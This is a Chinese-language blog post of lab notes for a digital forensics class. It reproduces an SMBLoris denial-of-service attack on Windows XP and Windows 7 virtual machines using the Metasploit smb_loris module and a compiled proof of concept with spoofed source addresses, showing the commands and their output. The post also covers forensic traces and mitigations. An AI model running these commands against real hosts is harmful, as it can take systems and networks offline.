---
---
title: 數位鑑識筆記 - SMBLoris
date: 2022/03/05
tags: 
  - Digital forensics
  - Linux
categories: 筆記
comments: true
description:
top_img: https://imgur.com/ZbnCCYY.jpg
cover: https://imgur.com/ZbnCCYY.jpg
---
## 導言
雖然上次說要把每次老師教的課程做紀錄
但每次上課不一定有教新的漏洞，有時比較偏向單純的鑑識
在系統裡找犯罪的痕跡，不太好寫一篇報告
不過這學期仍有相關的課，那我就來把學到的攻擊做一遍練習吧

---
## 主題
這次練習的是[SMBLoris](https://www.secpod.com/blog/smbloris/)
已經消失的[官網](https://web.archive.org/web/20190329104319/http://smbloris.com/)這邊用*archive.org*找出來給大家看
由@zerosum0x0 & @JennaMagius 所發現
基本上是透過攻擊SMB服務，透過每次傳送最大的上限的封包，來佔用對方伺服器的CPU、記憶體性能
屬於**DoS**類型的攻擊

甚麼是*SMB*?? [參考這個](https://bit.ly/3vKEndw)
簡單來說就是windows的區域網「檔案、印表機」通訊及分享系統
不過Linux上也有一套逆向工程出來的**Samba**
理論上影響著所有使用SMB協議的機器被開發出來

這次的受害環境有講師提供的*WindowsXP SP3*模擬機
分配的資源是1 CORE 1 GB Memory
還有*Windows 7 SP1*的模擬機
分配的資源是4 CORE 3 GB Memory
安全措施盡可能地關閉

---
## 攻擊

#### 需先準備軟體
1. **nmap**
2. **arp-scan**
3. **metasploit**
4. **GCC**
5. **SMBLoris** [**POC**](https://bit.ly/3KlCIz0) 
基本上準備個Kali Linux就能操作這次攻擊
*GCC*是要用來編譯攻擊程式

### 攻擊流程
#### 1. 使用**arp-scan**找到我們的目標主機
這一步也可使用各種工具找到對方即可
或是直接在目標主機輸入ifconfig(~~偷吃步~~
```shell
$ sudo arp-scan -l         
Interface: eth0, type: EN10MB, MAC: 00:0c:29:18:1d:29, IPv4: 192.168.85.130
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.85.1	00:50:56:c0:00:01	VMware, Inc.
192.168.85.129	00:0c:29:e3:ab:54	VMware, Inc.  <------這次的目標XP
192.168.85.131	00:0c:29:4d:0a:b6	VMware, Inc.  <------這次的目標Win7
192.168.85.254	00:50:56:f2:b3:9f	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.137 seconds (119.79 hosts/sec). 4 responded
```

#### 2.使用nmap尋找目標主機有哪些服務
```shell
$ nmap -A 192.168.85.129    
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 20:06 CST
Nmap scan report for 192.168.85.129
Host is up (0.36s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows XP microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h59m59s, deviation: 5h39m23s, median: -7h59m59s
|_nbstat: NetBIOS name: JIMMY-B91C1364D, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:e3:ab:54 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: jimmy-b91c1364d
|   NetBIOS computer name: JIMMY-B91C1364D\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-05T20:06:55+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.21 seconds
```

```shell
$ nmap -A 192.168.85.131    
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 20:15 CST
Nmap scan report for 192.168.85.131
Host is up (0.0090s latency).
Not shown: 986 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
2869/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-FCFV8BPF54U
| Not valid before: 2022-03-03T17:44:03
|_Not valid after:  2022-09-02T17:44:03
|_ssl-date: 2022-03-05T12:18:57+00:00; 0s from scanner time.
7070/tcp  open  ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2020-09-12T17:39:21
|_Not valid after:  2070-08-31T17:39:21
|_ssl-date: TLS randomness does not represent time
10243/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: WIN-FCFV8BPF54U; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2h00m00s, deviation: 3h59m59s, median: -1s
|_nbstat: NetBIOS name: WIN-FCFV8BPF54U, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:4d:0a:b6 (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-FCFV8BPF54U
|   NetBIOS computer name: WIN-FCFV8BPF54U\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-05T20:17:53+08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-05T12:17:53
|_  start_date: 2022-03-05T11:55:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.37 seconds
```

#### 3.檢查漏洞
我們可得知這兩部主機上皆有SMB服務在*PORT 445*上運行
由於這次的這個漏洞似乎不被微軟重視，理論上普遍存在所有利用SMB通訊的程式
不過你仍可以用nmap 腳本[**NSE**](https://github.com/cldrn/external-nse-script-library/blob/master/smb-smbloris.nse)來檢查
這邊以掃XP舉例
```shell
$ nmap -sV --script /home/susu/smb-smbloris.nse 192.168.85.129 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 14:38 CST
Nmap scan report for 192.168.85.129
Host is up (0.0036s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-smbloris: 
|   VULNERABLE:
|   Denial of service attack against Microsoft Windows SMB servers (SMBLoris)
|     State: VULNERABLE
|     Risk factor: HIGH  CVSSv3: 8.2 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)
|       All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.
|       
|     Disclosure date: 2017-08-1
|     References:
|_      http://smbloris.com/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.63 seconds
```
#### 4.攻擊
這次的攻擊有兩種實行的做法

一是利用*metaspolit*示範攻擊**Win 7主機**
這個漏洞在win7上能看到比較明顯的變化

二是利用*PoC*來達成示範攻擊**XP主機**
[這裡有關於PoC的詳細說明](https://packetstormsecurity.com/files/143636/SMBLoris-Denial-Of-Service.html)

##### 利用*metaspolit*

1. 設定系統的limit
由於這個攻擊會同時開啟很多連接
所以我們要先單獨更改shell能同時開啟的file
才能讓我們同時開很多Port占用對方資源(當然同時我們的電腦也要撐得住才行 :stuck_out_tongue:
[參考這篇的說明](https://bit.ly/3hDJFiK)
``$ ulimit -n 65535``

1. search
<pre><u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; search smbloris

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  auxiliary/dos/smb/smb_loris  2017-06-29       normal  No     <span style="background-color:#9755B3">SMBLoris</span> NBSS Denial of Service


Interact with a module by name or index. For example <font color="#5EBDAB">info 0</font>, <font color="#5EBDAB">use 0</font> or <font color="#5EBDAB">use auxiliary/dos/smb/smb_loris</font>
</pre>

3. use 與 設定選項
<pre><u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; use 0
<u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; options

Module options (auxiliary/dos/smb/smb_loris):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   rhost  192.168.85.131   yes       The target address
   rport  445              yes       SMB port on the target

<u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; set rhost 192.168.85.131
rhost =&gt; 192.168.85.131
</pre>

4. 攻擊
此時我們輸入``run``便可進行攻擊
要注意的是，這個攻擊不會自動結束，要手動關閉
因為這個模組會試圖保持連接
```shell
msf6 auxiliary(dos/smb/smb_loris) > run

[*] Starting server...
[*] 192.168.85.131:445 - 100 socket(s) open
[*] 192.168.85.131:445 - 200 socket(s) open
[*] 192.168.85.131:445 - 300 socket(s) open
[*] 192.168.85.131:445 - 400 socket(s) open
[*] 192.168.85.131:445 - 500 socket(s) open
[*] 192.168.85.131:445 - 600 socket(s) open
[*] 192.168.85.131:445 - 700 socket(s) open
[*] 192.168.85.131:445 - 800 socket(s) open
[*] 192.168.85.131:445 - 900 socket(s) open
[*] 192.168.85.131:445 - 1000 socket(s) open
跳過一點....
[*] 192.168.85.131:445 - 3900 socket(s) open
[!] 192.168.85.131:445 - At open socket limit with 3995 sockets open. Try increasing your system limits.
[*] 192.168.85.131:445 - 3995 socket(s) open
[*] 192.168.85.131:445 - Holding steady at 3995 socket(s) open
[*] 192.168.85.131:445 - Holding steady at 3995 socket(s) open
```

<img src="https://imgur.com/PoZcqRf.jpg" width="50%" height="50%">

至此，本次攻擊成功
這邊由於示範沒有讓他跑滿，若跑滿*65536*個PORT
可以吞掉大約8GB左右的記憶體
<img src="https://imgur.com/7tg8zNc.jpg" width="50%" height="50%">
圖片來自[官網](https://web.archive.org/web/20190329104319/http://smbloris.com/)

---
##### 利用PoC
雖然都叫PoC了，代表不是正式的攻擊工具
不過在我的情況下，這個工具才對我的XP系統在**CPU**有比較明顯的反應
Win 7更誇張了，會導致UI整個卡住:rofl:

1. 進行編譯
``$ gcc -o smbloris smbloris.c``
2. 攻擊
我們來看一下格式

```shell
$ sudo ./smbloris
Usage: ./smbloris <iface> <src_ip_start> <src_ip_end> <dst_ip>
```
這邊我們source IP暫時先設別組
如果設定我們自己的話，可能會被reply炸掉
```shell
$ sudo ./smbloris eth0 192.168.0.0 192.168.0.255 192.168.85.129
Local MAC address: 00:0c:29:18:1d:29
c0a80012:9196 1216900 sent, 0 errors (0), 0 replies, 0 resets^C
```

<img src="https://imgur.com/axwAzsa.jpg" width="50%" height="50%">

至此，本次攻擊成功
不知道為甚麼，有股SYN Flooding的既視感
不過跟Win 7有些不同，主要是CPU占用較為明顯
有關**記憶體**的主要部分反而沒有明顯的反應

---
## 鑑識

#### 需先準備軟體
1. **Wireshark**
2. **CurrPorts**

這次多了一套新軟體，CurrPorts是一款輕量級簡潔的小工具
可用來查看有哪些Port被程式使用

由於這次有兩部主機，所以各談各自的資料
#### Win 7

首先我們可以從Currports看到
有大量來自 **(Kali)** 192.168.85.130已建立的連線
<img src="https://imgur.com/RgvEnAn.jpg" width="50%" height="50%">

在WireShark中也可以看到
有大量來自MAC位置 **(Kali)** ``VMware_18:1d:29 (00:0c:29:18:1d:29)`` 往 **(Win 7)** ``VMware_4d:0a:b6 (00:0c:29:4d:0a:b6)`` 的封包
<img src="https://imgur.com/vuWHCAz.jpg" width="50%" height="50%">

#### Win XP

首先我們可以從Currports看到
有大量來自**不存在**的IP連線
這邊跟上面不同的是，連接並沒有被建立，對方(攻擊端)沒有給予回應
<img src="https://imgur.com/fXL9wWr.jpg" width="50%" height="50%">

在WireShark中也可以看到
有大量來自MAC位置 **(Kali)** ``VMware_18:1d:29 (00:0c:29:18:1d:29)`` 往 **(Win XP)** ``Vmware_e3:ab:54 (00:0c:29:e3:ab:54)`` 的封包
<img src="https://imgur.com/xhdRRkN.jpg" width="50%" height="50%">

---
## 解決方法
目前這個漏洞，Microsoft似乎沒有想要修復的意思:sweat_smile:
因為這個漏洞除了能透過防火牆直接封鎖外
加上SMB服務通常只開放於內網
所以這個漏洞也沒有CVE編號

所以首要的動作是，想盡辦法限制此服務只能夠於內網使用
**禁止外網連接Port 139, 445**

#### 1.
在windows這個漏洞麻煩的是，就算你關閉*SMB v1, v2, v3*服務也能夠被觸發
得直接把相關的**Port 139, 445給都關閉**才行
或是限制**單個IP能夠打開的連接**
#### 2.
在Linux的Samba部分的話，可透過設定smb.conf
``max smbd processes = 1000``
來限制系統可建立的連接

## 參考資料來源
[SMBLoris Windows Denial of Service Vulnerability(官網)](https://web.archive.org/web/20190329104319/http://smbloris.com/)
[SMBLoris: Remote Denial-of-Service Against Samba - Red Hat Customer Portal](https://red.ht/3hHtfWA)
[SMBLoris - An SMB DoS Vulnerability - SecPod Blog](https://bit.ly/35OmaAT)
[SMBLoris NBSS Denial of Service - Metasploit - InfosecMatter](https://bit.ly/3CheN0T)
[SMBLoris Attack](https://samsclass.info/124/proj14/smbl.htm)
[SMBLoris attack proof of concept: brings down my fully patched Win10 box in seconds.](https://twitter.com/marcan42/status/892716247502082051)
[SMBLoris Denial Of Service ≈ Packet Storm](https://bit.ly/3Kin1ca)
[SMBLoris: What You Need To Know | Rapid7 Blog](https://www.rapid7.com/blog/post/2017/08/03/smbloris-what-you-need-to-know/)
[SMBLoris PoC](https://gist.github.com/marcan/6a2d14b0e3eaa5de1795a763fb58641e)
[CNNVD關於Windows SMBLoris漏洞情況的通報](https://read01.com/4DGJJjO.html)

